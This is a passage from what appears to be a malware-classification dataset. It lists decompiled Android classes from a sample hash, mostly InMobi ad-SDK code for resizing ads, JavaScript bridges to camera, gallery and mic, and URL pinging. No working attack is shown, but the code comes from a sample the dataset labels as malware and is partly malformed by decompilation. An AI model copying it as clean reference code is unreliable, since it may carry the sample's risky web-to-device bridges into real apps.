((View)iMWebView.getParent()).setLayoutParams(layoutParams);   }   private void a(){     try {       FrameLayout frameLayout=new FrameLayout(this.a.getContext());       frameLayout.setId(PLACEHOLDER_ID);       ((ViewGroup)this.a.getOriginalParent()).addView(frameLayout,this.a.getOriginalIndex(),new ViewGroup.LayoutParams(this.a.getWidth(),this.a.getHeight()));       ((ViewGroup)this.a.getParent()).removeView(this.a);     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception in replaceByPlaceHolder "",e);     }   }   private void a(  ViewGroup viewGroup,  String str){     ViewGroup.LayoutParams a2=a(str);     CustomView customView=new CustomView(this.a.getContext(),this.a.getDensity(),CustomView.SwitchIconType.CLOSE_TRANSPARENT);     viewGroup.addView(customView,a2);     customView.setOnClickListener(new a());   } public class a implements View.OnClickListener {     a(){     }     @Override public void onClick(    View view){       IMWebView.userInitiatedClose=true;       MRAIDResizeController.this.a.close();     }   }   private RelativeLayout.LayoutParams a(  String str){     String b2=b(str);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams((int)(this.a.getDensity() * 50.0f),(int)(this.a.getDensity() * 50.0f));     if (b2.equals(""top-right"") || b2.equals(""bottom-right"")) {       layoutParams.addRule(11);     }     if (b2.equals(""bottom-right"") || b2.equals(""bottom-left"") || b2.equals(""bottom-center"")) {       layoutParams.addRule(12);       layoutParams.addRule(4);     }     if (b2.equals(""bottom-center"") || b2.equals(""top-center"") || b2.equals(""center"")) {       layoutParams.addRule(13);     }     if (b2.equals(""top-center"")) {       layoutParams.addRule(10);     }     return layoutParams;   }   private String b(  String str){     if (!str.equals(""top-left"") && !str.equals(""top-right"") && !str.equals(""bottom-left"")&& !str.equals(""bottom-right"")&& !str.equals(""top-center"")&& !str.equals(""bottom-center"")&& !str.equals(""center"")) {       return ""top-right"";     }     return str;   }   private void b(){     ((ViewGroup)this.a.getParent().getParent().getParent()).removeView((View)this.a.getParent().getParent());     ((ViewGroup)this.a.getParent()).removeView(this.a);     View findViewById=((View)this.a.getOriginalParent()).findViewById(PLACEHOLDER_ID);     ((ViewGroup)findViewById.getParent()).removeView(findViewById);     ((ViewGroup)this.a.getOriginalParent()).addView(this.a,this.a.getOriginalIndex());     this.a.resetLayout();   }   public void reset(){     this.resizeProperties=new JSController.ResizeProperties();   }   public void onOrientationChange(){     if (this.a.getStateVariable() == IMWebView.ViewState.RESIZED && !this.resizeProperties.allowOffscreen) {       doResize(null);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container.mraidimpl\ResizeDimensions.code","public class ResizeDimensions {   int a;   int b;   int c;   int d;   public int getX(){     return this.a;   }   public int getY(){     return this.b;   }   public int getWidth(){     return this.c;   }   public int getHeight(){     return this.d;   }   public ResizeDimensions(  int i,  int i2,  int i3,  int i4){     this.a=i;     this.b=i2;     this.c=i3;     this.d=i4;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\a.code","class a implements Parcelable.Creator<JSController.ResizeProperties> {   @Override public JSController.ResizeProperties createFromParcel(  Parcel parcel){     return new JSController.ResizeProperties(parcel);   }   @Override public JSController.ResizeProperties[] newArray(  int i){     return new JSController.ResizeProperties[i];   } } class a implements StartActivityForResultCallback {   a(){   }   @Override public void onActivityResult(  int i,  Intent intent){     if (i == -1) {       Bitmap compressedBitmap=ImageProcessing.getCompressedBitmap(ImageProcessing.convertMediaUriToPath(intent.getData(),JSUtilityController.this.mContext),JSUtilityController.this.mContext);       int width=compressedBitmap.getWidth();       int height=compressedBitmap.getHeight();       JSUtilityController.this.imWebView.raiseGalleryImageSelectedEvent(ImageProcessing.getBase64EncodedImage(compressedBitmap,JSUtilityController.this.mContext),width,height);       return;     }     JSUtilityController.this.imWebView.raiseError(""User did not select a picture"",""getGalleryImage"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\b.code","class b implements Parcelable.Creator<JSController.PlayerProperties> {   @Override public JSController.PlayerProperties createFromParcel(  Parcel parcel){     return new JSController.PlayerProperties(parcel);   }   @Override public JSController.PlayerProperties[] newArray(  int i){     return new JSController.PlayerProperties[i];   } } class b implements StartActivityForResultCallback {   final Uri a;   b(  Uri uri){     this.a=uri;   }   @Override public void onActivityResult(  int i,  Intent intent){     String convertMediaUriToPath;     if (i == -1) {       if (intent == null) {         convertMediaUriToPath=ImageProcessing.convertMediaUriToPath(this.a,JSUtilityController.this.mContext);       }  else {         convertMediaUriToPath=ImageProcessing.convertMediaUriToPath(intent.getData(),JSUtilityController.this.mContext);       }       Bitmap compressedBitmap=ImageProcessing.getCompressedBitmap(convertMediaUriToPath,JSUtilityController.this.mContext);       int width=compressedBitmap.getWidth();       int height=compressedBitmap.getHeight();       JSUtilityController.this.imWebView.raiseCameraPictureCapturedEvent(ImageProcessing.getBase64EncodedImage(compressedBitmap,JSUtilityController.this.mContext),width,height);       return;     }     JSUtilityController.this.imWebView.raiseError(""User did not take a picture"",""takeCameraPicture"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\c.code","class c implements Parcelable.Creator<JSController.Dimensions> {   @Override public JSController.Dimensions createFromParcel(  Parcel parcel){     return new JSController.Dimensions(parcel);   }   @Override public JSController.Dimensions[] newArray(  int i){     return new JSController.Dimensions[i];   } } class c implements StartActivityForResultCallback {   c(){   }   @Override public void onActivityResult(  int i,  Intent intent){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\d.code","public class d implements AudioTriggerCallback {   final JSUtilityController a;   public d(  JSUtilityController jSUtilityController){     this.a=jSUtilityController;   }   @Override public void audioLevel(  double d){     this.a.imWebView.raiseMicEvent(d);   } } public class d extends Thread {   final String a;   d(  String str){     this.a=str;   }   @Override public void run(){     HttpURLConnection httpURLConnection;     HttpURLConnection httpURLConnection2=null;     try {       try {         String replaceAll=this.a.replaceAll(""%25"",""%"");         Log.debug(Constants.RENDERING_LOG_TAG,""Pinging URL: "" + replaceAll);         httpURLConnection=(HttpURLConnection)new URL(replaceAll).openConnection();       }  catch (      Exception e) {         e=e;       }     }  catch (    Throwable th) {       th=th;     }     try {       httpURLConnection.setConnectTimeout(20000);       httpURLConnection.setRequestMethod(""GET"");       InternalSDKUtil.addCommonPropertiesToConnection(httpURLConnection);       Log.debug(Constants.RENDERING_LOG_TAG,""Async Ping Connection Response Code: "" + httpURLConnection.getResponseCode());       if (httpURLConnection != null) {         httpURLConnection.disconnect();       }     }  catch (    Exception e2) {       httpURLConnection2=httpURLConnection;       e=e2;       Log.debug(Constants.RENDERING_LOG_TAG,""Error doing async Ping. "",e);       if (httpURLConnection2 != null) {         httpURLConnection2.disconnect();       }     } catch (    Throwable th2) {       httpURLConnection2=httpURLConnection;       th=th2;       if (httpURLConnection2 != null) {         httpURLConnection2.disconnect();       }       throw th;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\Dimensions.code","public static class Dimensions extends ReflectedParcelable {   public static final Parcelable.Creator<Dimensions> CREATOR=new c();   public int height;   public int width;   public int x;   public int y;   public Dimensions(){     this.x=-1;     this.y=-1;     this.width=-1;     this.height=-1;   }   public Dimensions(  Parcel parcel){     super(parcel);   }   public String toString(){     return ""x: "" + this.x + "", y: ""+ this.y+ "", width: ""+ this.width+ "", height: ""+ this.height;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\e.code","class e implements Parcelable.Creator<JSController.Properties> {   @Override public JSController.Properties createFromParcel(  Parcel parcel){     return new JSController.Properties(parcel);   }   @Override public JSController.Properties[] newArray(  int i){     return new JSController.Properties[i];   } } class e implements StartActivityForResultCallback {   e(){   }   @Override public void onActivityResult(  int i,  Intent intent){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\ExpandProperties.code","public static class ExpandProperties extends ReflectedParcelable {   public static final Parcelable.Creator<ExpandProperties> CREATOR=new f();   public int actualHeightRequested;   public int actualWidthRequested;   public int bottomStuff;   public int currentX;   public int currentY;   public int height;   public boolean isModal;   public boolean lockOrientation;   public String orientation;   public int portraitHeightRequested;   public int portraitWidthRequested;   public String rotationAtExpand;   public int topStuff;   public boolean useCustomClose;   public int width;   public int x;   public int y;   public boolean zeroWidthHeight;   public ExpandProperties(){     reinitializeExpandProperties();   }   public void reinitializeExpandProperties(){     this.width=0;     this.height=0;     this.x=-1;     this.y=-1;     this.useCustomClose=false;     this.isModal=true;     this.lockOrientation=false;     this.orientation="""";     this.actualWidthRequested=0;     this.actualHeightRequested=0;     this.topStuff=0;     this.bottomStuff=0;     this.portraitWidthRequested=0;     this.portraitHeightRequested=0;     this.zeroWidthHeight=false;     this.rotationAtExpand="""";     this.currentX=0;     this.currentY=0;   }   public ExpandProperties(  Parcel parcel){     super(parcel);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\f.code","class f implements Parcelable.Creator<JSController.ExpandProperties> {   @Override public JSController.ExpandProperties createFromParcel(  Parcel parcel){     return new JSController.ExpandProperties(parcel);   }   @Override public JSController.ExpandProperties[] newArray(  int i){     return new JSController.ExpandProperties[i];   } } public class f extends BroadcastReceiver {   f(){   }   @Override public void onReceive(  Context context,  Intent intent){     if (""android.intent.action.DOWNLOAD_COMPLETE"".equals(intent.getAction())) {       long longExtra=intent.getLongExtra(""extra_download_id"",0L);       DownloadManager.Query query=new DownloadManager.Query();       query.setFilterById(longExtra);       Cursor query2=JSUtilityController.this.a.query(query);       if (query2.moveToFirst()) {         int columnIndex=query2.getColumnIndex(""status"");         if (16 == query2.getInt(columnIndex)) {           JSUtilityController.this.imWebView.raiseError(""download failed"",""storePicture"");         }  else {           if (8 == query2.getInt(columnIndex)) {           }         }       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\g.code","class g implements Parcelable.Creator<JSController.OrientationProperties> {   @Override public JSController.OrientationProperties createFromParcel(  Parcel parcel){     return new JSController.OrientationProperties(parcel);   }   @Override public JSController.OrientationProperties[] newArray(  int i){     return new JSController.OrientationProperties[i];   } } class g extends TimerTask {   g(){   }   @Override public void run(){     try {       JSUtilityController.this.imWebView.raiseVibrateCompleteEvent();     }  catch (    Exception e) {       Log.internal(Constants.RENDERING_LOG_TAG,""Vibrate callback execption"",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\JSController.code","public abstract class JSController {   public static final String EXIT=""exit"";   public static final String FULL_SCREEN=""fullscreen"";   public static final String STYLE_NORMAL=""normal"";   protected IMWebView imWebView;   protected Context mContext;   protected ExpandProperties expProps=new ExpandProperties();   protected ExpandProperties temporaryexpProps=new ExpandProperties();   public abstract void stopAllListeners(); public static class PlayerProperties extends ReflectedParcelable {     public static final Parcelable.Creator<PlayerProperties> CREATOR=new b();     public boolean audioMuted;     public boolean autoPlay;     public boolean doLoop;     public String id;     public boolean showControl;     public String startStyle;     public String stopStyle;     public PlayerProperties(){       this.showControl=true;       this.autoPlay=true;       this.audioMuted=false;       this.doLoop=false;       this.stopStyle=JSController.STYLE_NORMAL;       this.startStyle=JSController.STYLE_NORMAL;       this.id="""";     }     public PlayerProperties(    Parcel parcel){       super(parcel);     }     public void setStopStyle(    String str){       this.stopStyle=str;     }     public void setProperties(    boolean z,    boolean z2,    boolean z3,    boolean z4,    String str,    String str2,    String str3){       this.autoPlay=z2;       this.showControl=z3;       this.doLoop=z4;       this.audioMuted=z;       this.startStyle=str;       this.stopStyle=str2;       this.id=str3;     }     public boolean isAutoPlay(){       return this.autoPlay;     }     public boolean showControl(){       return this.showControl;     }     public boolean doLoop(){       return this.doLoop;     }     public boolean doMute(){       return this.audioMuted;     }     public boolean exitOnComplete(){       return this.stopStyle.equalsIgnoreCase(JSController.EXIT);     }     public boolean isFullScreen(){       return this.startStyle.equalsIgnoreCase(JSController.FULL_SCREEN);     }     public void setFullScreen(){       this.startStyle=JSController.FULL_SCREEN;     }   } public static class ExpandProperties extends ReflectedParcelable {     public static final Parcelable.Creator<ExpandProperties> CREATOR=new f();     public int actualHeightRequested;     public int actualWidthRequested;     public int bottomStuff;     public int currentX;     public int currentY;     public int height;     public boolean isModal;     public boolean lockOrientation;     public String orientation;     public int portraitHeightRequested;     public int portraitWidthRequested;     public String rotationAtExpand;     public int topStuff;     public boolean useCustomClose;     public int width;     public int x;     public int y;     public boolean zeroWidthHeight;     public ExpandProperties(){       reinitializeExpandProperties();     }     public void reinitializeExpandProperties(){       this.width=0;       this.height=0;       this.x=-1;       this.y=-1;       this.useCustomClose=false;       this.isModal=true;       this.lockOrientation=false;       this.orientation="""";       this.actualWidthRequested=0;       this.actualHeightRequested=0;       this.topStuff=0;       this.bottomStuff=0;       this.portraitWidthRequested=0;       this.portraitHeightRequested=0;       this.zeroWidthHeight=false;       this.rotationAtExpand="""";       this.currentX=0;       this.currentY=0;     }     public ExpandProperties(    Parcel parcel){       super(parcel);     }   } public static class OrientationProperties extends ReflectedParcelable {     public static final Parcelable.Creator<OrientationProperties> CREATOR=new g();     public boolean allowOrientationChange;     public String forceOrientation;     public OrientationProperties(){       initializeOrientationProperties();     }     public void initializeOrientationProperties(){       this.allowOrientationChange=false;       this.forceOrientation="""";     }     public OrientationProperties(    Parcel parcel){       super(parcel);     }   } public static class ResizeProperties extends ReflectedParcelable {     public static final Parcelable.Creator<ResizeProperties> CREATOR=new a();     public boolean allowOffscreen;     public String customClosePosition;     public int height;     public int offsetX;     public int offsetY;     public int width;     public ResizeProperties(){       initializeResizeProperties();     }     public void initializeResizeProperties(){       this.offsetY=0;       this.offsetX=0;       this.height=0;       this.width=0;       this.allowOffscreen=false;       this.customClosePosition=""top-right"";     }     public ResizeProperties(    Parcel parcel){       super(parcel);     }   } public static class Dimensions extends ReflectedParcelable {     public static final Parcelable.Creator<Dimensions> CREATOR=new c();     public int height;     public int width;     public int x;     public int y;     public Dimensions(){       this.x=-1;       this.y=-1;       this.width=-1;       this.height=-1;     }     public Dimensions(    Parcel parcel){       super(parcel);     }     public String toString(){       return ""x: "" + this.x + "", y: ""+ this.y+ "", width: ""+ this.width+ "", height: ""+ this.height;     }   } public static class Properties extends ReflectedParcelable {     public static final Parcelable.Creator<Properties> CREATOR=new e();     public int backgroundColor;     public float backgroundOpacity;     public boolean useBackground;     public Properties(    Parcel parcel){       super(parcel);     }     public Properties(){       this.useBackground=false;       this.backgroundColor=0;       this.backgroundOpacity=0.0f;     }   }   public JSController(  IMWebView iMWebView,  Context context){     this.imWebView=iMWebView;     this.mContext=context;   }   public static Object getFromJSON(  JSONObject jSONObject,  Class<?> cls) throws IllegalAccessException, InstantiationException, NumberFormatException, NullPointerException {     int i;     Field[] declaredFields=cls.getDeclaredFields();     Object newInstance=cls.newInstance();     for (    Field field : declaredFields) {       String replace=field.getName().replace('_','-');       String obj=field.getType().toString();       try {         if (obj.equals(""int"")) {           String lowerCase=jSONObject.getString(replace).toLowerCase(Locale.ENGLISH);           try {             if (lowerCase.startsWith(""#"")) {               i=-1;               try {                 if (lowerCase.startsWith(""#0x"")) {                   i=Integer.decode(lowerCase.substring(1)).intValue();                 }  else {                   i=Integer.parseInt(lowerCase.substring(1),16);                 }               }  catch (              NumberFormatException e) {               }             }  else {               i=Integer.parseInt(lowerCase);             }           }  catch (          NumberFormatException e2) {             i=0;           }           field.set(newInstance,Integer.valueOf(i));         }  else         if (obj.equals(""class java.lang.String"")) {           field.set(newInstance,jSONObject.getString(replace));         }  else         if (obj.equals(""boolean"")) {           field.set(newInstance,Boolean.valueOf(jSONObject.getBoolean(replace)));         }  else         if (obj.equals(""float"")) {           field.set(newInstance,Float.valueOf(Float.parseFloat(jSONObject.getString(replace))));         }  else         if (obj.equals(""class com.mraid.NavigationStringEnum"")) {           field.set(newInstance,NavigationStringEnum.fromString(jSONObject.getString(replace)));         }  else         if (obj.equals(""class com.mraid.TransitionStringEnum"")) {           field.set(newInstance,TransitionStringEnum.fromString(jSONObject.getString(replace)));         }       }  catch (      JSONException e3) {       }     }     return newInstance;   } public static class ReflectedParcelable implements Parcelable {     public ReflectedParcelable(){     }     @Override public int describeContents(){       return 0;     }     protected ReflectedParcelable(    Parcel parcel){       for (      Field field : getClass().getDeclaredFields()) {         try {           Class<?> type=field.getType();           if (type.isEnum()) {             String cls=type.toString();             if (cls.equals(""class com.mraid.NavigationStringEnum"")) {               field.set(this,NavigationStringEnum.fromString(parcel.readString()));             }  else             if (cls.equals(""class com.mraid.TransitionStringEnum"")) {               field.set(this,TransitionStringEnum.fromString(parcel.readString()));             }           }  else           if (!(field.get(this) instanceof Parcelable.Creator)) {             field.set(this,parcel.readValue(null));           }         }  catch (        IllegalAccessException e) {           e.printStackTrace();           return;         } catch (        IllegalArgumentException e2) {           e2.printStackTrace();           return;         }       }     }     @Override public void writeToParcel(    Parcel parcel,    int i){       for (      Field field : getClass().getDeclaredFields()) {         try {           Class<?> type=field.getType();           if (type.isEnum()) {             String cls=type.toString();             if (cls.equals(""class com.mraid.NavigationStringEnum"")) {               parcel.writeString(((NavigationStringEnum)field.get(this)).getText());             }  else             if (cls.equals(""class com.mraid.TransitionStringEnum"")) {               parcel.writeString(((TransitionStringEnum)field.get(this)).getText());             }           }  else {             Object obj=field.get(this);             if (!(obj instanceof Parcelable.Creator)) {               parcel.writeValue(obj);             }           }         }  catch (        IllegalAccessException e) {           e.printStackTrace();           return;         } catch (        IllegalArgumentException e2) {           e2.printStackTrace();           return;         }       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.controller\JSDisplayController.code","public class JSDisplayController extends JSController {   private WindowManager a;   private float b;   private JSController.OrientationProperties c;   private JSController.ResizeProperties d;   public JSDisplayController(  IMWebView iMWebView,  Context context){     super(iMWebView,context);     this.c=null;     this.d=null;     DisplayMetrics displayMetrics=new DisplayMetrics();     this.a=(WindowManager)context.getSystemService(""window"");     this.a.getDefaultDisplay().getMetrics(displayMetrics);     this.b=((Activity)this.mContext).getResources().getDisplayMetrics().density;   }   @JavascriptInterface public void open(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(1),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> open: url: "" + str);     this.imWebView.openURL(str);   }   @JavascriptInterface public String getState(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(3),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> getState"");     return this.imWebView.getState();   }   private JSController.ExpandProperties a(  JSController.ExpandProperties expandProperties){     Display defaultDisplay=this.a.getDefaultDisplay();     int i=((Activity)this.mContext).getResources().getDisplayMetrics().widthPixels;     int i2=((Activity)this.mContext).getResources().getDisplayMetrics().heightPixels;     View findViewById=((Activity)this.mContext).getWindow().findViewById(R.id.content);     expandProperties.topStuff=findViewById.getTop();     expandProperties.bottomStuff=i2 - findViewById.getBottom();     int displayRotation=InternalSDKUtil.getDisplayRotation(defaultDisplay);     if (InternalSDKUtil.isDefOrientationLandscape(displayRotation,i,i2)) {       displayRotation++;       if (displayRotation > 3) {         displayRotation=0;       }       if (InternalSDKUtil.isTablet(this.mContext)) {         this.imWebView.isTablet=true;       }     }     int i3=displayRotation;     Log.debug(Constants.RENDERING_LOG_TAG,""Device current rotation: "" + i3);     Log.debug(Constants.RENDERING_LOG_TAG,""Density of device: "" + this.b);     expandProperties.width=(int)(expandProperties.width * this.b);     expandProperties.height=(int)(expandProperties.height * this.b);     expandProperties.x=(int)(expandProperties.x * this.b);     expandProperties.y=(int)(expandProperties.y * this.b);     expandProperties.currentX=0;     expandProperties.currentY=0;     this.imWebView.publisherOrientation=((Activity)this.imWebView.getContext()).getRequestedOrientation();     if (i3 == 0 || i3 == 2) {       expandProperties.rotationAtExpand=""portrait"";     }  else {       expandProperties.rotationAtExpand=""landscape"";     }     if (expandProperties.height <= 0 || expandProperties.width <= 0) {       expandProperties.height=i2;       expandProperties.width=i;       expandProperties.zeroWidthHeight=true;     }     if (i3 == 0 || i3 == 2) {       expandProperties.portraitWidthRequested=expandProperties.width;       expandProperties.portraitHeightRequested=expandProperties.height;     }  else {       expandProperties.portraitWidthRequested=expandProperties.height;       expandProperties.portraitHeightRequested=expandProperties.width;     }     Log.debug(Constants.RENDERING_LOG_TAG,""Device Width: "" + i + "" Device height: ""+ i2);     int i4=i2 - expandProperties.topStuff;     if (expandProperties.width > i) {       expandProperties.width=i;     }     if (expandProperties.height > i4) {       expandProperties.height=i4;     }     int[] iArr=new int[2];     this.imWebView.getLocationOnScreen(iArr);     if (expandProperties.x < 0) {       expandProperties.x=iArr[0];     }     if (expandProperties.y < 0) {       expandProperties.y=iArr[1] - expandProperties.topStuff;       Log.debug(Constants.RENDERING_LOG_TAG,""topStuff: "" + expandProperties.topStuff + "" ,bottomStuff: ""+ expandProperties.bottomStuff);     }     Log.debug(Constants.RENDERING_LOG_TAG,""loc 0: "" + iArr[0] + "" loc 1: ""+ iArr[1]);     int i5=i - (expandProperties.x + expandProperties.width);     if (i5 < 0) {       expandProperties.x=i5 + expandProperties.x;       if (expandProperties.x < 0) {         expandProperties.width+=expandProperties.x;         expandProperties.x=0;       }     }     int i6=i4 - (expandProperties.y + expandProperties.height);     if (i6 < 0) {       expandProperties.y=i6 + expandProperties.y;       if (expandProperties.y < 0) {         expandProperties.height+=expandProperties.y;         expandProperties.y=0;       }     }     expandProperties.currentX=expandProperties.x;     expandProperties.currentY=expandProperties.y;     Log.debug(Constants.RENDERING_LOG_TAG,""final expanded width after density : "" + expandProperties.width + ""final expanded height after density ""+ expandProperties.height+ ""portrait width requested :""+ expandProperties.portraitWidthRequested+ ""portrait height requested :""+ expandProperties.portraitHeightRequested);     return expandProperties;   }   @JavascriptInterface public String getExpandProperties(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(4),null));     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""width"",this.expProps.width);       jSONObject.put(""height"",this.expProps.height);       jSONObject.put(""isModal"",this.expProps.isModal);       jSONObject.put(""useCustomClose"",this.expProps.useCustomClose);       jSONObject.put(""lockOrientation"",this.expProps.lockOrientation);       jSONObject.put(""orientation"",this.expProps.orientation);     }  catch (    JSONException e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Failed to get screen size"");     }     return jSONObject.toString();   }   @JavascriptInterface public String getOrientationProperties(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(5),null));     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""allowOrientationChange"",this.c.allowOrientationChange);       jSONObject.put(""orientation"",this.c.forceOrientation);     }  catch (    JSONException e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Failed to get screen size"");     }     return jSONObject.toString();   }   @JavascriptInterface public String getResizeProperties(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(6),null));     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(""width"",this.d.width);       jSONObject.put(""height"",this.d.height);       jSONObject.put(""offsetX"",this.d.offsetX);       jSONObject.put(""offsetY"",this.d.offsetY);       jSONObject.put(""customClosePosition"",this.d.customClosePosition);       jSONObject.put(""allowOffscreen"",this.d.allowOffscreen);     }  catch (    JSONException e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Failed to get screen size"");     }     return jSONObject.toString();   }   @JavascriptInterface public void setExpandProperties(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(7),null));     try {       this.expProps=(JSController.ExpandProperties)getFromJSON(new JSONObject(str),JSController.ExpandProperties.class);       this.expProps.isModal=true;       Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> ExpandProperties is set: Expandable Width: "" + this.expProps.width + "" Expandable height: ""+ this.expProps.height+ "" Expandable orientation: ""+ this.expProps.orientation+ "" Expandable lock orientation: ""+ this.expProps.lockOrientation+ "" Expandable Modality: ""+ this.expProps.isModal+ "" Expandable Use Custom close: ""+ this.expProps.useCustomClose);       this.imWebView.setCustomClose(this.expProps.useCustomClose);       if (this.d == null) {         this.imWebView.setOrientationPropertiesForInterstitial(this.expProps.lockOrientation,this.expProps.orientation);       }     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception while setting the expand properties "" + e);     }   }   @JavascriptInterface public void setResizeProperties(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(9),null));     try {       this.d=(JSController.ResizeProperties)getFromJSON(new JSONObject(str),JSController.ResizeProperties.class);       Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> ResizeProperties is set: Resize Width: "" + this.d.width + "" Resize height: ""+ this.d.height+ "" Resize offsetX: ""+ this.d.offsetX+ "" Resize offsetY: ""+ this.d.offsetY+ "" customClosePosition: ""+ this.d.customClosePosition+ "" allowOffscreen: ""+ this.d.allowOffscreen);     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception while setting the expand properties "" + e);     }   }   @JavascriptInterface public void setOrientationProperties(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(8),null));     try {       this.c=(JSController.OrientationProperties)getFromJSON(new JSONObject(str),JSController.OrientationProperties.class);       Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> OrientationProperties is set: Expandable orientation: "" + this.expProps.orientation + "" Expandable lock orientation: ""+ this.expProps.lockOrientation);       this.imWebView.setOrientationPropertiesForInterstitial(!this.c.allowOrientationChange,this.c.forceOrientation);     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception while setting the expand properties "" + e);     }   }   @JavascriptInterface public void expand(  String str){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(11),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> expand: url: "" + str);     try {       if (this.imWebView.getStateVariable() == IMWebView.ViewState.EXPANDED || this.imWebView.getStateVariable() == IMWebView.ViewState.EXPANDING) {         Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> Already expanded state"");         return;       }       if (this.imWebView.getStateVariable() == IMWebView.ViewState.HIDDEN) {         Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> Expand cannot be called in hidden state. Doing nothing."");         return;       }       this.imWebView.mExpandController.useLockOrient=false;       if (this.imWebView.getStateVariable() != IMWebView.ViewState.DEFAULT && this.imWebView.getStateVariable() != IMWebView.ViewState.RESIZED && this.imWebView.getStateVariable() != IMWebView.ViewState.RESIZING) {         this.imWebView.raiseError(""Current state is not default"",""expand"");         return;       }       if (this.imWebView.getStateVariable() == IMWebView.ViewState.DEFAULT && this.imWebView.mIsInterstitialAd) {         this.imWebView.raiseError(""Expand cannot be called on interstitial ad"",""expand"");         return;       }       a(this.temporaryexpProps,this.expProps);       JSController.ExpandProperties expandProperties=this.temporaryexpProps;       this.temporaryexpProps.height=0;       expandProperties.width=0;       Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> At the time of expand the properties are: Expandable width: "" + this.temporaryexpProps.width + "" Expandable height: ""+ this.temporaryexpProps.height+ "" Expandable orientation: ""+ this.temporaryexpProps.orientation+ "" Expandable lock orientation: ""+ this.temporaryexpProps.lockOrientation+ "" Expandable Modality: ""+ this.temporaryexpProps.isModal+ "" Expandable Use custom close ""+ this.temporaryexpProps.useCustomClose);       this.expProps=a(this.expProps);       if (this.c != null) {         this.imWebView.lockExpandOrientation(this.c.allowOrientationChange ? false : true,this.c.forceOrientation);       }  else {         this.imWebView.lockExpandOrientation(this.temporaryexpProps.lockOrientation,this.temporaryexpProps.orientation);       }       this.imWebView.expand(str,a(this.temporaryexpProps));     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception while expanding the ad. "",e);     }   }   @JavascriptInterface public void resize(){     ApiStatCollector.getLogger().logEvent(new EventLog(new ApiStatCollector.ApiEventType(12),null));     Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> resize"");     try {       if (this.imWebView.getStateVariable() == IMWebView.ViewState.RESIZING) {         Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> Already resize state"");       }  else       if (this.imWebView.getStateVariable() == IMWebView.ViewState.HIDDEN) {         Log.debug(Constants.RENDERING_LOG_TAG,""JSDisplayController-> Resize cannot be called in hidden state. Doing nothing."");       }  else       if (this.imWebView.getStateVariable() != IMWebView.ViewState.DEFAULT && this.imWebView.getStateVariable() != IMWebView.ViewState.RESIZED) {         this.imWebView.raiseError(""Current state is neither default nor resized"",""resize"");       }  else       if (this.imWebView.mIsInterstitialAd) {         this.imWebView.raiseError(""Resize cannot be called on interstitial ad"",""resize"");       }  else {         JSController.ResizeProperties resizeProperties=new JSController.ResizeProperties();         a(resizeProperties,this.d);         resizeProperties.width=(int)(resizeProperties.width * this.imWebView.getDensity());         resizeProperties.height=(int)(resizeProperties.height * 